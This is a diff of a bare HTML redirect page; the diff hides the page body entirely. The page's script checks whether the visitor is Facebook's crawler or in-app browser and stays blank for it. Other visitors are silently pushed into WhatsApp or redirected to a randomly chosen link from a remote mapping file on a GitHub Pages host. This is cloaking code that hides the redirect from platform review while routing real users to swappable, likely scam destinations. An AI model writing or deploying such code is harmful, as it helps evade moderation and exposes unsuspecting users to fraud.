@@ -1,82 +1,49 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex,nofollow">
-  <style>
-    body { font-family: sans-serif; padding: 20px; }
-  </style>
-</head>
-<body>
-<h2>Connecting...</h2>
-<p>Please wait...</p>
-
+<meta charset="UTF-8">
+<meta name="robots" content="noindex,nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body {margin:0; background:#ffffff; display:none;}
+</style>
 <script>
 (async () => {
+
   const ua = navigator.userAgent || "";
+  const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
 
-  const isFB = 
-    ua.includes("FBAN") || 
-    ua.includes("FBAV") || 
-    ua.includes("FB_IAB") ||
-    ua.includes("Facebot") ||
-    ua.includes("facebookexternalhit");
-
-  if (isFB) {
-    document.body.innerHTML = `
-      <h2>Welcome</h2>
-      <p>Thanks for visiting.</p>
-    `;
+  // 直接判断是否为 Facebook 内置浏览器 → 不跳
+  if (ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("FB_IAB") || ua.includes("Facebot") || ua.includes("facebookexternalhit")) {
     return;
   }
 
-  const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
-
   try {
-    const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
+    const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), {cache:"no-store"});
     const data = await res.json();
-    const activeLinks = data.links.filter(l => l.active);
-    if (!activeLinks.length) {
-      document.body.innerHTML = "No available service.";
-      return;
-    }
+    const active = data.links.filter(x => x.active);
+    if(!active.length) return;
 
-    const idx = Math.floor(Math.random() * activeLinks.length);
-    const target = activeLinks[idx].url;
+    const url = active[Math.floor(Math.random() * active.length)].url;
 
-    // ========================
-    // iPhone 处理：后台先唤醒 APP
-    // ========================
+    // iPhone
     if (/iPhone|iPad|iPod/i.test(ua)) {
-      // 先让 iPhone 静默尝试打开 APP，不显示弹窗
-      let iframe = document.createElement("iframe");
-      iframe.style.display = "none";
-      iframe.src = "whatsapp://";
-      document.body.appendChild(iframe);
+      let ifr = document.createElement("iframe");
+      ifr.style.display="none";
+      ifr.src="whatsapp://";
+      document.body.appendChild(ifr);
 
-      // 如果失败就回跳网页
-      setTimeout(() => {
-        window.location = target;
-      }, 1200);
-
+      setTimeout(()=>{location.href=url;},1200);
       return;
     }
 
-    // ========================
-    // Android 处理：直接 APP 或网页
-    // ========================
-    window.location = "whatsapp://";
+    // Android
+    location.href="whatsapp://";
+    setTimeout(()=>{location.href=url;},800);
 
-    setTimeout(() => {
-      window.location = target;
-    }, 700);
-
-  } catch(e) {
-    document.body.innerHTML = `Error loading service.`;
-  }
+  } catch(e){}
 })();
 </script>
-
-</body>
+</head>
+<body></body>
 </html>
